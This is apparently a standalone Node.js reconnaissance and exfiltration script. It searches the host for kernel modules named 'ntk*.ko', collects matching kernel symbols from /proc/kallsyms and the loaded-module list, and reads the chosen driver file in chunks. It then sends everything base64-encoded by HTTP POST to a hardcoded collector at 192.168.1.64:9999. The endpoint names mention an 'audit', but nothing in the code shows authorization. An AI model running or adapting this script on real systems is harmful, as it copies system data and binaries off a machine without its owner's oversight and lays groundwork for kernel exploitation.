"use strict";
var fs = require("fs");
var http = require("http");
var cp = require("child_process");

var HOST = "192.168.1.64";
var PORT = 9999;

function post(path, body) {
    var data = JSON.stringify(body);
    var req = http.request({ host: HOST, port: PORT, path: path, method: "POST",
        headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } },
        function (res) { console.log("posted " + path + " -> " + res.statusCode); });
    req.on("error", function (e) { console.log("post error " + e.message); });
    req.write(data);
    req.end();
}

function run(cmd) {
    try { return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: 30000 }); }
    catch (e) { return "ERR " + (e.stdout ? e.stdout : e.message); }
}

var out = {};
out.started = new Date().toISOString();
out.find = run("find /lib/modules /opt /usr/lib /usr/local -name 'ntk*.ko' 2>/dev/null | head -20");
out.kallsyms = run("grep -iE 'ntksys|ntk_sys|ntk_ioctl|ntkmem|ntk_mem' /proc/kallsyms 2>/dev/null | head -40");
out.procmods = run("cat /proc/modules | head -30");
post("/audit31_diag", out);

var lines = out.find.split("\n");
var target = "";
for (var i = 0; i < lines.length; i++) {
    var L = lines[i].trim();
    if (L.indexOf("ntkdriver") >= 0) { target = L; break; }
    if (!target && L.indexOf(".ko") > 0 && L.indexOf(" ") < 0) target = L;
}

if (target) {
    try {
        var size = fs.statSync(target).size;
        out.target = target;
        out.size = size;
        post("/audit31_target", out);
        var CHUNKB = 250000;
        var sent = 0;
        for (var off = 0; off < size; off += CHUNKB) {
            var n = Math.min(CHUNKB, size - off);
            var fd = fs.openSync(target, "r");
            var b = new Buffer(n);
            fs.readSync(fd, b, 0, n, off);
            fs.closeSync(fd);
            post("/ntk_chunk_" + off, { file: target, off: off, size: size, b64: b.toString("base64") });
            sent += n;
        }
        out.sent = sent;
    } catch (e) { out.dump_err = "" + e.message; }
} else {
    out.dump_err = "no .ko found";
}
post("/audit31_done", out);
setTimeout(function () { process.exit(0); }, 25000);
